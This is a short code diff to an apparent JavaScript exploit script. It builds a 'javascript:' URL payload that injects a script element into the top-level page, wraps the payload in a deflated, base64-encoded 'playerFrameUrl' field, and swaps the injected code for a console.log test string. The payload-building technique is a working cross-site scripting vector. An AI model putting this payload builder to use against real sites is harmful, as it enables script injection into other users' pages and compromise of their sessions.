@@ -35,11 +35,13 @@ if (!TOP_JS) {
     throw new Error(`Unknown vector: ${vector}`);
 }
 
+const TOP_JS2 = "console.log('hello from payload');";
 const PAYLOAD = 'javascript:void' + encodeURIComponent(
     "(function(){var s=top.document.createElement('script');s.textContent=" +
-    JSON.stringify(TOP_JS) +
+    JSON.stringify(TOP_JS2) +
     ";top.document.documentElement.appendChild(s);s.remove();}())"
 );
+
 const encoded = encodeURIComponent(
     zlib.deflateSync(Buffer.from(JSON.stringify({ playerFrameUrl: PAYLOAD }), 'utf8')).toString('base64')
 );
